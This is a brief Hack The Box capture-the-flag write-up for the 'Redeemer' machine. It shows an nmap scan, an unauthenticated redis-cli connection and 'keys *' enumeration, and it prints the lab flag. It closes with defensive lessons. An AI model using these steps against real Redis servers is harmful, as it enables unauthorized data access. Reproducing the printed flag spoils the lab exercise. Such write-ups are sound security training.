# Redeemer — Hack The Box Writeup

- **Difficulty:** Very Easy
- **OS:** Linux
- **Category:** Starting Point
- **Date:** May 2026

---

## Summary
Redeemer is a Linux machine running Redis with no 
authentication, allowing anyone to connect and read 
all data stored in the database.

---

## Recon

### Nmap Scan
nmap -sV -Pn -p 6379 10.129.219.23

### Results
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

---

## Exploitation

Connected to Redis with no password:
redis-cli -h 10.129.219.23

Listed all keys:
keys *

Retrieved flag directly from database.

---

## Flag
03e1d2b376c37ab3f5319922053953eb

---

## Lessons Learned
- Redis should always require authentication
- Never expose Redis to the internet
- In-memory databases can contain extremely sensitive data
